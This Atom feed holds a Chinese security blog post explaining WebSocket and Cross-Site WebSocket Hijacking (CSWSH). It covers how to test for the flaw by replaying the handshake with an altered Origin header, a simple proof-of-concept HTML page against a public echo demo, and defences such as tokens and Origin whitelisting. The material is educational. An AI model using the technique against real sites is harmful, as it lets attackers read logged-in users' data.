<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea的新闻栏</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mi1k7ea.com/"/>
  <updated>2019-10-05T05:37:13.634Z</updated>
  <id>https://www.mi1k7ea.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CSWSH漏洞总结</title>
    <link href="https://www.mi1k7ea.com/2019/10/04/CSWSH%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2019/10/04/CSWSH漏洞总结/</id>
    <published>2019-10-04T14:19:29.000Z</published>
    <updated>2019-10-05T05:37:13.634Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-WebSocket"><a href="#0x01-WebSocket" class="headerlink" title="0x01 WebSocket"></a>0x01 WebSocket</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>一般的，Web应用的交互过程通常是客户端通过浏览器发出一个请求，服务器端接收请求后进行处理并返回结果给客户端，客户端浏览器将信息呈现。这种机制对于信息变化不是特别频繁的应用尚可，但却不适用于高并发与用户实时响应的场景，比如股票的实时信息、地图导航等。</p><p>于是，基于HTML5规范的、有Web TCP之称的WebSocket应运而生。</p><p><img src="/2019/10/04/CSWSH漏洞总结/6.png" alt=""></p><p>WebSocket是HTML5一种新的协议，它实现了浏览器和服务器全双工通信，更好地节省服务器资源和宽带并达到实时通讯，它建立在TCP之上，同HTTP一样通过TCP来传输数据，但和HTTP协议的不同点在于：</p><ul><li>WebSocket是持久化的协议，而HTTP是非持久连接；</li><li>WebSocket是一种双向通信协议，在建立连接后，WebSocket服务器和浏览器/客户端代理都能主动地向对方发送或接收数据，就像Socket一样，而HTTP是单向通信协议；</li><li>WebSocket需要类似TCP的三次握手连接，但和TCP不同的是，WebSocket是基于HTTP协议进行的握手，连接成功后才能相互通信；</li><li>WebSocket具有功能强大、双向、低延迟等特征，特别是针对实时的、事件驱动的Web应用程序而言，不惜要的网络流量和延迟得以显著减少，通信效率和应用程序表现大大提升；</li></ul><p>WebSocket定义了两种URI格式：ws://和wss://，类似于HTTP和HTTPS，ws://使用明文传输，默认端口为80，wss://使用TLS加密传输，默认端口为443。</p><h3 id="协议转换与报文特征"><a href="#协议转换与报文特征" class="headerlink" title="协议转换与报文特征"></a>协议转换与报文特征</h3><p>WebSocket协议是基于HTTP协议进行的握手连接之后才转换过来的。通信协议从http://或https://切换到ws://或wss://后，表示应用已经切换到了WebSocket协议通信状态了。</p><p>websocket.org页面上，点击Connect会发现请求的协议为ws://，并且响应码是101，一旦服务器返回101响应即意味着完成了WebSocket协议的切换：</p><p><img src="/2019/10/04/CSWSH漏洞总结/1.png" alt=""></p><p>该站点也提供了客户端的HTML与JS代码来访问WebSocket，JS建立WebSocket连接的接口为<code>new WebSocket(url, [protocol] )</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>WebSocket Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="keyword">var</span> wsUri = <span class="string">"wss://echo.websocket.org/"</span>;</span></span><br><span class="line"><span class="actionscript"> <span class="keyword">var</span> output;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="javascript">   output = <span class="built_in">document</span>.getElementById(<span class="string">"output"</span>);</span></span><br><span class="line"><span class="undefined">   testWebSocket();</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">testWebSocket</span><span class="params">()</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="actionscript">   websocket = <span class="keyword">new</span> WebSocket(wsUri);</span></span><br><span class="line"><span class="actionscript">   websocket.onopen = <span class="function"><span class="keyword">function</span><span class="params">(evt)</span> </span>&#123; onOpen(evt) &#125;;</span></span><br><span class="line"><span class="actionscript">   websocket.onclose = <span class="function"><span class="keyword">function</span><span class="params">(evt)</span> </span>&#123; onClose(evt) &#125;;</span></span><br><span class="line"><span class="actionscript">   websocket.onmessage = <span class="function"><span class="keyword">function</span><span class="params">(evt)</span> </span>&#123; onMessage(evt) &#125;;</span></span><br><span class="line"><span class="actionscript">   websocket.onerror = <span class="function"><span class="keyword">function</span><span class="params">(evt)</span> </span>&#123; onError(evt) &#125;;</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">onOpen</span><span class="params">(evt)</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="actionscript">   writeToScreen(<span class="string">"CONNECTED"</span>);</span></span><br><span class="line"><span class="actionscript">   doSend(<span class="string">"WebSocket rocks"</span>);</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">onClose</span><span class="params">(evt)</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="actionscript">   writeToScreen(<span class="string">"DISCONNECTED"</span>);</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">onMessage</span><span class="params">(evt)</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">   writeToScreen('<span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"color: blue;"</span>&gt;</span>RESPONSE: ' + evt.data+'<span class="tag">&lt;/<span class="name">span</span>&gt;</span>');</span></span></span><br><span class="line"><span class="undefined">   websocket.close();</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">onError</span><span class="params">(evt)</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">   writeToScreen('<span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>ERROR:<span class="tag">&lt;/<span class="name">span</span>&gt;</span> ' + evt.data);</span></span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">doSend</span><span class="params">(message)</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="actionscript">   writeToScreen(<span class="string">"SENT: "</span> + message);</span></span><br><span class="line"><span class="undefined">   websocket.send(message);</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">writeToScreen</span><span class="params">(message)</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> pre = <span class="built_in">document</span>.createElement(<span class="string">"p"</span>);</span></span><br><span class="line"><span class="actionscript">   pre.style.wordWrap = <span class="string">"break-word"</span>;</span></span><br><span class="line"><span class="undefined">   pre.innerHTML = message;</span></span><br><span class="line"><span class="undefined">   output.appendChild(pre);</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"> <span class="built_in">window</span>.addEventListener(<span class="string">"load"</span>, init, <span class="literal">false</span>);</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">h2</span>&gt;</span>WebSocket Test<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"output"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问该HTML文件就会自己发送WebSocket请求，在Frames一栏可看到进行交互的WebSocket协议信息：</p><p><img src="/2019/10/04/CSWSH漏洞总结/5.png" alt=""></p><p>Burp能抓取到协议转换的这个101报文，但之后ws://或wss://协议的通信报文就抓不到了：</p><p><img src="/2019/10/04/CSWSH漏洞总结/2.png" alt=""></p><p>看到两个关键的头字段Connection和Upgrade，相当于告诉服务端要申请切换到WebSocket协议。其中Connection头字段指定Upgrade、申请切换协议，而Upgrade头字段指定为websocket、具体告诉服务端想切换的协议为WebSocket。</p><p>整个WebSocket协议切换报文如下：</p><p><img src="/2019/10/04/CSWSH漏洞总结/3.png" alt=""></p><p>其他一些头字段解释如下：</p><table><thead><tr><th style="text-align:left">HTTP头</th><th style="text-align:left">是否必须</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">Host</td><td style="text-align:left">是</td><td style="text-align:left">服务端主机名</td></tr><tr><td style="text-align:left">Upgrade</td><td style="text-align:left">是</td><td style="text-align:left">固定值，”websocket”</td></tr><tr><td style="text-align:left">Connection</td><td style="text-align:left">是</td><td style="text-align:left">固定值，”Upgrade”</td></tr><tr><td style="text-align:left">Sec-WebSocket-Key</td><td style="text-align:left">是</td><td style="text-align:left">客户端临时生成的16字节随机值, base64编码</td></tr><tr><td style="text-align:left">Sec-WebSocket-Version</td><td style="text-align:left">是</td><td style="text-align:left">WebSocket协议版本</td></tr><tr><td style="text-align:left">Origin</td><td style="text-align:left">否</td><td style="text-align:left">可选, 发起连接请求的源</td></tr><tr><td style="text-align:left">Sec-WebSocket-Accept</td><td style="text-align:left">是(服务端)</td><td style="text-align:left">服务端识别连接生成的随机值</td></tr><tr><td style="text-align:left">Sec-WebSocket-Protocol</td><td style="text-align:left">否</td><td style="text-align:left">可选，客户端支持的协议</td></tr><tr><td style="text-align:left">Sec-WebSocket-Extensions</td><td style="text-align:left">否</td><td style="text-align:left">可选， 扩展字段</td></tr></tbody></table><p>两个重要的安全头，Sec-WebSocket-Key与Sec-WebSocket-Accept：客户端负责生成一个Base64编码过的随机数字作为Sec-WebSocket-Key，服务器则会将一个GUID和这个客户端的随机数一起生成一个散列Key作为Sec-WebSocket-Accept返回给客户端。这个工作机制可以用来避免缓存代理（caching proxy），也可以用来避免请求重播（request replay）。</p><p>出于安全考虑而设计的，以“Sec-”开头的头字段可以避免被浏览器脚本读取到，这样攻击者就不能利用XHR来伪造WebSocket请求来执行跨协议攻击，因为XHR接口不允许设置Sec-开头的Header。</p><h3 id="WebSocket属性"><a href="#WebSocket属性" class="headerlink" title="WebSocket属性"></a>WebSocket属性</h3><table><thead><tr><th style="text-align:left">属性</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">Socket.readyState</td><td style="text-align:left">只读属性 <strong>readyState</strong> 表示连接状态，可以是以下值：0 - 表示连接尚未建立。1 - 表示连接已建立，可以进行通信。2 - 表示连接正在进行关闭。3 - 表示连接已经关闭或者连接不能打开。</td></tr><tr><td style="text-align:left">Socket.bufferedAmount</td><td style="text-align:left">只读属性 <strong>bufferedAmount</strong> 已被 send() 放入正在队列中等待传输，但是还没有发出的 UTF-8 文本字节数。</td></tr></tbody></table><h3 id="WebSocket事件"><a href="#WebSocket事件" class="headerlink" title="WebSocket事件"></a>WebSocket事件</h3><table><thead><tr><th style="text-align:left">事件</th><th style="text-align:left">事件处理程序</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">open</td><td style="text-align:left">Socket.onopen</td><td style="text-align:left">连接建立时触发</td></tr><tr><td style="text-align:left">message</td><td style="text-align:left">Socket.onmessage</td><td style="text-align:left">客户端接收服务端数据时触发</td></tr><tr><td style="text-align:left">error</td><td style="text-align:left">Socket.onerror</td><td style="text-align:left">通信发生错误时触发</td></tr><tr><td style="text-align:left">close</td><td style="text-align:left">Socket.onclose</td><td style="text-align:left">连接关闭时触发</td></tr></tbody></table><h3 id="WebSocket方法"><a href="#WebSocket方法" class="headerlink" title="WebSocket方法"></a>WebSocket方法</h3><table><thead><tr><th style="text-align:left">方法</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">Socket.send()</td><td style="text-align:left">使用连接发送数据</td></tr><tr><td style="text-align:left">Socket.close()</td><td style="text-align:left">关闭连接</td></tr></tbody></table><h3 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h3><p>跨域是WebSocket与生俱来的能力。</p><p>由前面协议转换可知，WebSocket客户端不仅仅局限于浏览器，因此WebSocket协议没有规范Origin必须相同，未指定ACAO，也没有规定服务器在握手阶段应该如何认证客户端身份，因而同源策略、CORS机制并不适用于WebSocket协议。</p><h2 id="0x02-CSWSH漏洞"><a href="#0x02-CSWSH漏洞" class="headerlink" title="0x02 CSWSH漏洞"></a>0x02 CSWSH漏洞</h2><p>CSWSH全称Cross-site WebSocket Hijacking，跨站点WebSocket劫持漏洞。</p><h3 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h3><p>支持WebSocket协议的Web站点如股票实时查询、地图导航等，并且未对请求的Origin头字段进行校验。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>CSWSH漏洞类似于全能型的CSRF漏洞，可读可写。</p><p>漏洞根源是WebSocket天生可跨域，不受同源策略的影响。在此基础上，若目标服务端未对WebSocket协议请求的Origin头字段进行校验，则会导致WebSocket协议请求可被攻击者劫持，从而窃取敏感信息。</p><p>下面看个修改过的图，是目标站点存在cookie校验机制的场景：</p><p><img src="/2019/10/04/CSWSH漏洞总结/4.png" alt=""></p><ol><li>用户首先登录stock.com实时查询股票信息，其中该站点支持WebSocket，需要用户携带cookie访问；</li><li>接着用户被诱使在当前的浏览器访问beauty.com，其中加载了恶意JS代码到用户的浏览器中执行；</li><li>恶意JS代码通过WebSocket协议向stock.com站点发起请求，此时请求是用户浏览器发起的、是自动带上cookie信息的；</li><li>stock.com收到恶意JS发送的WebSocket请求，由于未校验ws://请求的Origin头字段，在检测cookie合法后，返回敏感信息到用户浏览器；</li><li>用户浏览器中的恶意JS收到stock.com响应的WebSocket协议响应信息后，发往攻击者服务器，从而造成跨站点WebSocket劫持攻击；</li></ol><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>进行CSWSH漏洞挖掘前需要准备好一款可以重放WebSocket协议报文的代理工具，Burp是做不到的，但是我们可以选择OWASP ZAP来实现。</p><p>一般的漏洞挖掘步骤：</p><ol><li>找到支持WebSocket的站点；</li><li>使用ZAP等代理工具重放切换WebSocket协议的报文，其中修改Origin头查看服务端是否校验Origin头；</li><li>若未校验Origin头，则进一步发送WebSocket连接报文查看能否成功利用；</li></ol><p>当然，切换协议的请求报文依然是可以使用Burp来完成的，这里修改Origin头之后再重放报文，发现成功响应101报文，证明该站点未校验Origin，可能存在CSWSH漏洞：</p><p><img src="/2019/10/04/CSWSH漏洞总结/7.png" alt=""></p><p>由于未找到合适的靶场环境，下面以<code>https://demos.kaazing.com/echo/index.html</code>为例演示，该站点建立的WebSocket连接是无需带cookie的。</p><p>先用ZAP代理抓取到101响应报文：</p><p><img src="/2019/10/04/CSWSH漏洞总结/8.png" alt=""></p><p>建立WebSocket连接后，通过该协议发送信息，在ZAP的WebSockets一栏可以查看到发送的内容：</p><p><img src="/2019/10/04/CSWSH漏洞总结/9.png" alt=""></p><p>使用ZAP重放切换WebSocket协议请求的报文，修改Origin头：</p><p><img src="/2019/10/04/CSWSH漏洞总结/10.png" alt=""></p><p>发送过去后响应101，说明协议切换成功，服务端并未校验Origin头：</p><p><img src="/2019/10/04/CSWSH漏洞总结/11.png" alt=""></p><p>下面就编写PoC ws_exp.html，直接拿前面的代码修改下，放置在攻击者的服务器上，原理就是XHR发起建立WebSocket协议请求，建立成功后尝试发送”Mi1k7ea“字符串信息通信，若返回内容为”Mi1k7ea“则证明能够正常进行WebSocket通信，即能够被跨站点劫持进行WebSocket通信：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>WebSocket Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="keyword">var</span> wsUri = <span class="string">"wss://demos.kaazing.com/echo"</span>;</span></span><br><span class="line"><span class="actionscript"> <span class="keyword">var</span> output;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="javascript">   output = <span class="built_in">document</span>.getElementById(<span class="string">"output"</span>);</span></span><br><span class="line"><span class="undefined">   testWebSocket();</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">testWebSocket</span><span class="params">()</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="actionscript">   websocket = <span class="keyword">new</span> WebSocket(wsUri);</span></span><br><span class="line"><span class="actionscript">   websocket.onopen = <span class="function"><span class="keyword">function</span><span class="params">(evt)</span> </span>&#123; onOpen(evt) &#125;;</span></span><br><span class="line"><span class="actionscript">   websocket.onclose = <span class="function"><span class="keyword">function</span><span class="params">(evt)</span> </span>&#123; onClose(evt) &#125;;</span></span><br><span class="line"><span class="actionscript">   websocket.onmessage = <span class="function"><span class="keyword">function</span><span class="params">(evt)</span> </span>&#123; onMessage(evt) &#125;;</span></span><br><span class="line"><span class="actionscript">   websocket.onerror = <span class="function"><span class="keyword">function</span><span class="params">(evt)</span> </span>&#123; onError(evt) &#125;;</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">onOpen</span><span class="params">(evt)</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="actionscript">   writeToScreen(<span class="string">"CONNECTED"</span>);</span></span><br><span class="line"><span class="actionscript">   doSend(<span class="string">"Mi1k7ea"</span>);</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">onClose</span><span class="params">(evt)</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="actionscript">   writeToScreen(<span class="string">"DISCONNECTED"</span>);</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">onMessage</span><span class="params">(evt)</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">   writeToScreen('<span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"color: blue;"</span>&gt;</span>RESPONSE: ' + evt.data+'<span class="tag">&lt;/<span class="name">span</span>&gt;</span>');</span></span></span><br><span class="line"><span class="actionscript">   <span class="keyword">if</span> (<span class="string">"Mi1k7ea"</span> == evt.data) &#123;alert(<span class="string">"存在CSWSH漏洞!"</span>);&#125;</span></span><br><span class="line"><span class="undefined">   websocket.close();</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">onError</span><span class="params">(evt)</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">   writeToScreen('<span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>ERROR:<span class="tag">&lt;/<span class="name">span</span>&gt;</span> ' + evt.data);</span></span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">doSend</span><span class="params">(message)</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="actionscript">   writeToScreen(<span class="string">"SENT: "</span> + message);</span></span><br><span class="line"><span class="undefined">   websocket.send(message);</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">writeToScreen</span><span class="params">(message)</span></span></span></span><br><span class="line"><span class="undefined"> &#123;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> pre = <span class="built_in">document</span>.createElement(<span class="string">"p"</span>);</span></span><br><span class="line"><span class="actionscript">   pre.style.wordWrap = <span class="string">"break-word"</span>;</span></span><br><span class="line"><span class="undefined">   pre.innerHTML = message;</span></span><br><span class="line"><span class="undefined">   output.appendChild(pre);</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"> <span class="built_in">window</span>.addEventListener(<span class="string">"load"</span>, init, <span class="literal">false</span>);</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">h2</span>&gt;</span>WebSocket Test<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"output"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然，PoC很简单，具体操作可自行发挥。</p><p>诱使已登录目标站点的用户在同一浏览器访问攻击者服务器上的ws_exp.html（当然这里是假设场景），看到能正常建立WebSocket连接并正常通信：</p><p><img src="/2019/10/04/CSWSH漏洞总结/12.png" alt=""></p><p>此时Origin头是指向攻击者服务器的，由于后台未校验Origin导致可被跨站点劫持：</p><p><img src="/2019/10/04/CSWSH漏洞总结/13.png" alt=""></p><h2 id="0x03-检测与防御"><a href="#0x03-检测与防御" class="headerlink" title="0x03 检测与防御"></a>0x03 检测与防御</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>修改请求报文中的Origin头字段，重放该WebSocket协议升级请求，若服务器返回101响应则表示连接成功即未对源进行检测，则可能存在CSWSH漏洞。</p><p>最好是进一步测试是否可以发送WebSocket消息，若这个WebSocket连接能够发送/接受消息的话，则完全证明CSWSH漏洞的存在。</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>使用token机制；</li><li>使用白名单校验请求报文的Origin头字段；</li></ul><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.ibm.com/developerworks/cn/java/j-lo-websocket-cross-site/index.html" target="_blank" rel="noopener">深入理解跨站点 WebSocket 劫持漏洞的原理及防范</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxOTc0NzExNg==&amp;mid=2665515571&amp;idx=1&amp;sn=0d0b7dea7f77e8f1844b366f1af9667f&amp;chksm=80d67270b7a1fb66d93bae6cb36eabb52671ca9c4fcfcbd4b99a0f97477ea3d7f7ef87f086f3&amp;token=1745763505&amp;lang=zh_CN#rd" target="_blank" rel="noopener">小心 ！跨站点websocket劫持！</a></p><p><a href="https://www.freebuf.com/vuls/198234.html" target="_blank" rel="noopener">挖洞经验 | 利用跨站WebSocket劫持（CSWH）实现账户劫持</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="CSWSH" scheme="https://www.mi1k7ea.com/tags/CSWSH/"/>
    
  </entry>
  
  <entry>
    <title>bWAPP之Cross-Origin Resource Sharing (AJAX)</title>
    <link href="https://www.mi1k7ea.com/2019/09/28/bWAPP%E4%B9%8BCross-Origin-Resource-Sharing-AJAX/"/>
    <id>https://www.mi1k7ea.com/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/</id>
    <published>2019-09-28T15:57:15.000Z</published>
    <updated>2019-09-28T16:05:10.672Z</updated>
    
